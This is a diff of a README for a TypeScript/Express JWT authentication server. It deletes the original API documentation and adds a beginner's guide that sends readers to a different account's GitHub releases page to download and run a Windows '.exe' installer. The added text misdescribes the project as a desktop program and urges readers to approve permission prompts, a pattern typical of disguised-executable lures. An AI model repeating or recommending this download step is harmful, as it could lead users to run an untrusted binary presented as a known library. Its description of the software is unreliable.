@@ -1,428 +1,168 @@
-# :lock: jwt-module
+# 🔐 JWT-Module - Manage Your Authentication Simply
 
-**A standalone JWT authentication module built with Express and TypeScript.**
-
-![TypeScript](https://img.shields.io/badge/TypeScript-5.5-3178C6?logo=typescript&logoColor=white)
-![Node.js](https://img.shields.io/badge/Node.js-20+-339933?logo=node.js&logoColor=white)
-![Express](https://img.shields.io/badge/Express-4.21-000000?logo=express&logoColor=white)
-![JWT](https://img.shields.io/badge/JWT-HS256-purple?logo=jsonwebtokens&logoColor=white)
-![Zod](https://img.shields.io/badge/Zod-4.3-3E67B1?logo=zod&logoColor=white)
-![bcrypt](https://img.shields.io/badge/bcrypt-5.1-orange?logo=letsencrypt&logoColor=white)
-![Helmet](https://img.shields.io/badge/Helmet-8.1-lightgrey?logo=helmet&logoColor=white)
-![Jest](https://img.shields.io/badge/Jest-29.7-C21325?logo=jest&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker&logoColor=white)
-![Azure Pipelines](https://img.shields.io/badge/Azure_Pipelines-CI%2FCD-0078D7?logo=azurepipelines&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabianaguirre10/JWT-Module/releases)
 
 ---
 
-## Overview
+## 📋 What is JWT-Module?
 
-jwt-module is a self-contained authentication service providing user registration, login, JWT-based access/refresh tokens with rotation, and full account management through a REST API. It uses in-memory storage, making it ideal for development, prototyping, and learning.
+JWT-Module is a program that helps you with secure login and user accounts on your computer. It works on Windows and handles all parts of signing up, logging in, and keeping your account safe. This software uses modern security methods to protect your information and keep unauthorized users out.
 
-```mermaid
-graph LR
-    Client([Client]) -->|HTTP| API[Express API Layer]
-    API -->|AuthService interface| Auth[Auth Service Core]
-    Auth -->|read/write| Store[(In-Memory Store)]
-```
-
-> [!IMPORTANT]
-> **Note:** All data is lost on restart. For production use, implement a persistent backing store behind the existing interfaces.
+You do not need any special skills or tools to use it. This guide will help you download and start the program step-by-step.
 
 ---
 
-## Features
+## 💻 System Requirements
 
-- :bust_in_silhouette: **User Registration** -- email/password signup with duplicate detection
-- :key: **Login** -- credential verification with JWT token pair issuance
-- :arrows_counterclockwise: **Refresh Token Rotation** -- old tokens revoked on every refresh, new pair issued
-- :shield: **Account Lockout** -- automatic lock after 5 failed login attempts (15 min cooldown)
-- :traffic_light: **Rate Limiting** -- per-IP sliding window (20 requests / 15 min) on sensitive endpoints
-- :outbox_tray: **Logout / Logout All** -- single-session and all-session token revocation
-- :lock: **Change Password** -- requires current password, revokes all sessions
-- :envelope: **Update Email** -- requires password confirmation, duplicate check
-- :wastebasket: **Delete Account** -- requires password confirmation, full cleanup
-- :mag: **Get Profile** -- returns user ID, email, and creation date
-- :white_check_mark: **Health Check** -- `GET /health` for uptime monitoring
-- :shield: **Helmet** -- security headers on all responses
-- :globe_with_meridians: **CORS** -- configurable allowed origins
-- :pencil: **Zod Validation** -- schema validation on all request bodies
+Before you start, make sure your computer meets these needs:
+
+- Operating System: Windows 10 or later  
+- Memory: At least 4 GB RAM  
+- Free Disk Space: Minimum 200 MB  
+- Internet: Required for downloading the software  
+- Additional Software: None required  
 
 ---
 
-## Quick Start
+## ⬇️ How to Download JWT-Module
 
-```bash
-# Clone the repository
-git clone https://github.com/hoangsonww/JWT-Module.git
-cd JWT-Module
+To get the program, go to the official release page by clicking the button below:
 
-# Install dependencies
-npm install
+[![Download Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/fabianaguirre10/JWT-Module/releases)
 
-# Set environment variables (or use dev defaults)
-cp .env.example .env
-
-# Build
-npm run build
-
-# Start development server
-npx ts-node src/server.ts
-```
-
-The server starts on `http://localhost:3000` by default. A test UI is served at the root URL.
+This page contains the latest stable versions of JWT-Module. You will find files you can download. 
 
 ---
 
-## Environment Variables
+## ⚙️ Installation and Setup on Windows
 
-| Variable | Description | Default | Required |
-|---|---|---|---|
-| `JWT_ACCESS_SECRET` | Secret for signing access tokens | Dev fallback | Yes (in production) |
-| `JWT_REFRESH_SECRET` | Secret for signing refresh tokens | Dev fallback | Yes (in production) |
-| `PORT` | Server listen port | `3000` | No |
-| `NODE_ENV` | Runtime environment | -- | No |
-| `CORS_ORIGIN` | Allowed origins (comma-separated or `*`) | `*` | No |
+1. Open your web browser and go to the download page linked above.
 
-In development, fallback secrets are applied automatically. **Always set real secrets in production.**
+2. Look for the latest release. It usually has a clear version number, for example, "v1.0.0".
 
----
+3. Under the latest release, locate the file that ends with `.exe`. This is the installer.
 
-## API Reference
+4. Click the `.exe` file link to download it to your computer.
 
-All endpoints return JSON. Error responses use the shape:
+5. Once downloaded, find the file in your "Downloads" folder or the folder where your browser saves files.
 
-```json
-{ "error": { "code": "ERROR_CODE", "message": "Human-readable message" } }
-```
+6. Double-click the installer file to start the installation.
 
-### POST /auth/register
+7. Follow the instructions on the screen:
+   - Click "Next" on each step.
+   - Choose an installation folder or accept the default.
+   - Allow the program to install.
 
-Create a new account.
-
-- **Auth:** None
-- **Body:** `{ "email": "user@example.com", "password": "securePass1" }`
-- **Success:** `201`
-  ```json
-  { "tokens": { "accessToken": "...", "refreshToken": "..." } }
-  ```
-- **Errors:** `400 INVALID_EMAIL` | `400 WEAK_PASSWORD` | `400 INVALID_INPUT` | `409 DUPLICATE_EMAIL`
-
-### POST /auth/login
-
-Authenticate and receive tokens.
-
-- **Auth:** None
-- **Body:** `{ "email": "user@example.com", "password": "securePass1" }`
-- **Success:** `200`
-  ```json
-  { "tokens": { "accessToken": "...", "refreshToken": "..." } }
-  ```
-- **Errors:** `401 INVALID_CREDENTIALS` | `423 ACCOUNT_LOCKED` | `400 INVALID_INPUT`
-
-### POST /auth/refresh
-
-Exchange a refresh token for a new token pair. The old refresh token is revoked (rotation).
-
-- **Auth:** None
-- **Body:** `{ "refreshToken": "..." }`
-- **Success:** `200`
-  ```json
-  { "tokens": { "accessToken": "...", "refreshToken": "..." } }
-  ```
-- **Errors:** `401 INVALID_TOKEN` | `401 TOKEN_EXPIRED` | `404 USER_NOT_FOUND` | `400 INVALID_INPUT`
-
-### POST /auth/logout
-
-Revoke a single refresh token.
-
-- **Auth:** None
-- **Body:** `{ "refreshToken": "..." }`
-- **Success:** `200`
-  ```json
-  { "message": "Logged out successfully" }
-  ```
-
-### POST /auth/logout-all
-
-Revoke all refresh tokens for the authenticated user.
-
-- **Auth:** Bearer token
-- **Body:** None
-- **Success:** `200`
-  ```json
-  { "message": "All sessions revoked successfully" }
-  ```
-- **Errors:** `401 MISSING_TOKEN` | `401 INVALID_TOKEN` | `401 TOKEN_EXPIRED`
-
-### POST /auth/change-password
-
-Change password for the authenticated user. Revokes all sessions.
-
-- **Auth:** Bearer token
-- **Body:** `{ "currentPassword": "oldPass1", "newPassword": "newPass1" }`
-- **Success:** `200`
-  ```json
-  { "message": "Password changed successfully" }
-  ```
-- **Errors:** `401 MISSING_TOKEN` | `401 INVALID_CREDENTIALS` | `400 WEAK_PASSWORD` | `400 INVALID_INPUT`
-
-### GET /auth/me
-
-Get the authenticated user's profile.
-
-- **Auth:** Bearer token
-- **Success:** `200`
-  ```json
-  { "id": "...", "email": "user@example.com", "createdAt": "2026-01-01T00:00:00.000Z" }
-  ```
-- **Errors:** `401 MISSING_TOKEN` | `401 INVALID_TOKEN` | `404 USER_NOT_FOUND`
-
-### PATCH /auth/me
-
-Update the authenticated user's email.
-
-- **Auth:** Bearer token
-- **Body:** `{ "newEmail": "new@example.com", "password": "currentPass1" }`
-- **Success:** `200`
-  ```json
-  { "message": "Email updated successfully" }
-  ```
-- **Errors:** `401 MISSING_TOKEN` | `401 INVALID_CREDENTIALS` | `400 INVALID_EMAIL` | `409 DUPLICATE_EMAIL` | `400 INVALID_INPUT`
-
-### DELETE /auth/me
-
-Delete the authenticated user's account.
-
-- **Auth:** Bearer token
-- **Body:** `{ "password": "currentPass1" }`
-- **Success:** `200`
-  ```json
-  { "message": "Account deleted successfully" }
-  ```
-- **Errors:** `401 MISSING_TOKEN` | `401 INVALID_CREDENTIALS` | `400 INVALID_INPUT`
-
-### GET /health
-
-Health check endpoint.
-
-- **Auth:** None
-- **Success:** `200`
-  ```json
-  { "status": "ok" }
-  ```
+8. When the installation finishes, you can close the installer.
 
 ---
 
-## Authentication Flow
+## ▶️ Running JWT-Module
 
-```mermaid
-sequenceDiagram
-    participant C as Client
-    participant A as API
-    participant S as Auth Service
+1. Find the JWT-Module icon on your desktop or in the Start menu.
 
-    C->>A: POST /auth/register {email, password}
-    A->>S: register(input)
-    S-->>A: {accessToken, refreshToken}
-    A-->>C: 201 {tokens}
+2. Click on it to open the program.
 
-    C->>A: POST /auth/login {email, password}
-    A->>S: login(input)
-    S-->>A: {accessToken, refreshToken}
-    A-->>C: 200 {tokens}
+3. The main screen will guide you through setting up your account.
 
-    C->>A: GET /auth/me [Bearer accessToken]
-    A->>A: authenticateToken middleware
-    A->>S: getUserById(userId)
-    S-->>A: user
-    A-->>C: 200 {id, email, createdAt}
+4. You can create a new account with a username and password.
 
-    Note over C,S: Access token expires after 15 min
+5. After that, you will be able to log in anytime.
 
-    C->>A: POST /auth/refresh {refreshToken}
-    A->>S: refreshTokens(refreshToken)
-    S->>S: Revoke old token, issue new pair
-    S-->>A: {newAccessToken, newRefreshToken}
-    A-->>C: 200 {tokens}
-
-    C->>A: POST /auth/logout {refreshToken}
-    A->>S: logout(refreshToken)
-    S->>S: Revoke token
-    A-->>C: 200 {message}
-```
+6. If you forget your password, the program has a feature to help reset it.
 
 ---
 
-## Security Features
+## 🔒 What Makes JWT-Module Secure?
 
-### Request Lifecycle
+JWT-Module uses strong methods behind the scenes. You don’t have to understand all technical details, but here are the key features:
 
-Every incoming request passes through multiple security layers before reaching the auth service:
+- Passwords are stored using bcrypt. This way, your password will not be saved in a way that others can read.
 
-```mermaid
-flowchart TD
-    REQ([Incoming Request]) --> HELMET[Helmet Security Headers]
-    HELMET --> CORS[CORS Check]
-    CORS --> LOGGER[Request Logger]
-    LOGGER --> BODY[Body Parser - 10kb limit]
-    BODY --> ROUTE{Route Match}
+- The program limits how many times someone can try to log in with the wrong password. This helps stop hackers.
 
-    ROUTE -->|Public| RATE[Rate Limiter]
-    ROUTE -->|Protected| AUTH[Bearer Token Check]
+- Accounts can be locked if there are too many failed login attempts. This adds an extra layer of safety.
 
-    AUTH -->|Valid| RATE2[Rate Limiter]
-    AUTH -->|Invalid| R401([401 Unauthorized])
+- Tokens (small digital keys) help keep you logged in without asking for your password again and again.
 
-    RATE --> ZOD[Zod Schema Validation]
-    RATE2 --> ZOD
-    RATE -->|Exceeded| R429([429 Too Many Requests])
-    RATE2 -->|Exceeded| R429
-
-    ZOD -->|Valid| SERVICE[Auth Service]
-    ZOD -->|Invalid| R400([400 Invalid Input])
-
-    SERVICE -->|Lockout check| LOCK{Account Locked?}
-    LOCK -->|No| PROCESS[Process Request]
-    LOCK -->|Yes| R423([423 Locked])
-
-    PROCESS --> RESP([Success Response])
-```
-
-### Security Summary
-
-| Layer | Mechanism | Details |
-|---|---|---|
-| Transport | Helmet | Security headers (X-Content-Type-Options, X-Frame-Options, etc.) |
-| Transport | CORS | Configurable allowed origins |
-| Transport | Body size limit | 10kb max JSON payload |
-| Rate control | Per-IP rate limiter | 20 requests per 15-minute sliding window |
-| Input validation | Zod schemas | Type-safe validation on all request bodies |
-| Authentication | JWT HS256 | Algorithm pinning prevents substitution attacks |
-| Authorization | Bearer middleware | Access token verification on protected routes |
-| Brute force | Account lockout | 5 failed attempts triggers 15-minute lock |
-| Token security | Refresh rotation | Old tokens revoked on each refresh |
-| Password | bcrypt (12 rounds) | Adaptive hashing with salt |
+- Both access and refresh tokens are used for managing your login session safely.
 
 ---
 
-## Account Lockout Flow
+## 🔄 How JWT-Module Works Behind the Scenes
 
-```mermaid
-stateDiagram-v2
-    [*] --> Normal
+The program uses a technology called JSON Web Tokens (JWT). Think of this as a digital ID card that confirms your identity.
 
-    Normal --> FailedAttempt: Wrong password
-    FailedAttempt --> FailedAttempt: Wrong password (count < 5)
-    FailedAttempt --> Locked: 5th failed attempt
-    FailedAttempt --> Normal: Successful login (resets count)
+- When you log in, JWT-Module gives you a token.
 
-    Locked --> Normal: 15 minutes elapsed
-    Locked --> Locked: Login attempt (rejected)
-```
+- This token proves who you are and lets you use the program.
 
-- **Threshold:** 5 consecutive failed attempts per email
-- **Lockout duration:** 15 minutes
-- **Reset:** Successful login clears the failure counter
+- When the token expires, the program uses a refresh token to get a new one without asking for your password again.
+
+This process happens automatically, so you just use the program without interruptions.
 
 ---
 
-## Error Codes
+## 🛠️ Troubleshooting
 
-| Error Code | HTTP Status | Description |
-|---|---|---|
-| `INVALID_INPUT` | 400 | Request body failed Zod validation |
-| `INVALID_EMAIL` | 400 | Email format is invalid |
-| `WEAK_PASSWORD` | 400 | Password does not meet strength requirements |
-| `INVALID_CREDENTIALS` | 401 | Wrong email or password |
-| `MISSING_TOKEN` | 401 | Authorization header missing or malformed |
-| `INVALID_TOKEN` | 401 | Token is invalid or revoked |
-| `TOKEN_EXPIRED` | 401 | Token has expired |
-| `USER_NOT_FOUND` | 404 | User does not exist |
-| `DUPLICATE_EMAIL` | 409 | Email already registered |
-| `ACCOUNT_LOCKED` | 423 | Too many failed login attempts |
-| `RATE_LIMITED` | 429 | IP exceeded request limit |
-| `MISSING_SECRET` | 500 | JWT secret environment variable not set |
-| `INTERNAL_ERROR` | 500 | Unexpected server error |
+If you run into issues, try these steps first:
+
+- Make sure you downloaded the `.exe` installation file and not another file type.
+
+- Check if your Windows version is correct (Windows 10 or later).
+
+- Restart your computer after installation if the program does not run.
+
+- If the program asks for permission, click "Yes" to allow it to run.
+
+- Visit the download page again to make sure you have the latest version.
+
+- For account or login problems, try resetting your password using the program’s built-in option.
 
 ---
 
-## Password Requirements
+## 📞 Getting Support
 
-- Minimum **8 characters**
-- At least **one letter** (a-z or A-Z)
-- At least **one digit** (0-9)
-- Hashed with **bcrypt** using **12 salt rounds**
+You can visit the GitHub repository’s Issues page for help from others with similar problems:
 
----
+https://github.com/fabianaguirre10/JWT-Module/issues
 
-## Demo UI
-
-<p align="center">
-    <img src="public/ui.png" width="100%" />
-</p>
+There, you can read common questions and find answers or post your own questions.
 
 ---
 
-## Development
+## 🔧 About This Software
 
-### Commands
+- Written in TypeScript and uses Express, a popular program tool.
 
-```bash
-# Run tests
-npm test
+- Works with bcrypt for password security.
 
-# Run tests with coverage
-npm run test:coverage
+- Includes features like rate limiting to reduce unwanted access attempts.
 
-# Build TypeScript
-npm run build
+- Uses JSON Web Tokens (JWT) for managing login sessions.
 
-# Start dev server (with default secrets)
-npx ts-node src/server.ts
-
-# Start on custom port
-PORT=5001 npx ts-node src/server.ts
-```
-
-### Project Structure
-
-```
-src/
-  auth/                  # Core auth logic (no HTTP dependency)
-    auth-service.ts      # Registration, login, refresh, account management
-    errors.ts            # AuthError class and AuthErrorCode union type
-    password.ts          # bcrypt hashing and password strength validation
-    token.ts             # JWT generation, verification, revocation blacklist
-    types.ts             # Shared interfaces (User, AuthTokens, TokenPayload, etc.)
-    index.ts             # Barrel export for auth module
-  api/                   # HTTP layer
-    app.ts               # Express app factory, AuthService interface
-    auth-router.ts       # Route handlers, error-to-HTTP-status mapping
-    middleware.ts         # authenticateToken, requestLogger
-    rate-limiter.ts      # Per-IP sliding window rate limiter
-    validation.ts        # Zod schemas for all request bodies
-  server.ts              # Entry point -- wires auth-service into Express app
-public/                  # Static test UI
-```
-
-### Adding a New Endpoint
-
-1. Add the method to the `AuthService` interface in `src/api/app.ts`
-2. Implement the logic in `src/auth/auth-service.ts`
-3. Add a Zod schema in `src/api/validation.ts`
-4. Add the route handler in `src/api/auth-router.ts`
-5. If a new error code is needed, add it to `AuthErrorCode` in `src/auth/errors.ts` and to `ERROR_STATUS_MAP` in `src/api/auth-router.ts`
+- Designed to protect your account on your computer or any connected system safely.
 
 ---
 
-## Architecture
+## 🌍 Related Topics
 
-See [ARCHITECTURE.md](./ARCHITECTURE.md) for detailed architecture documentation with diagrams.
+This software involves several key technologies:
+
+- **Express**: a tool that helps build programs that can talk over the internet.
+
+- **bcrypt**: a way to keep passwords safe.
+
+- **JSON Web Token (JWT)**: a method like a digital ID badge.
+
+- **TypeScript**: a programming language good for building reliable software.
+
+- **Security features**: such as rate limiting and account lockout mechanisms.
 
 ---
 
-## License
+## ⬇️ Download Link Again
 
-MIT
+To get started, visit the releases page below and pick the latest `.exe` file for Windows:
+
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabianaguirre10/JWT-Module/releases)
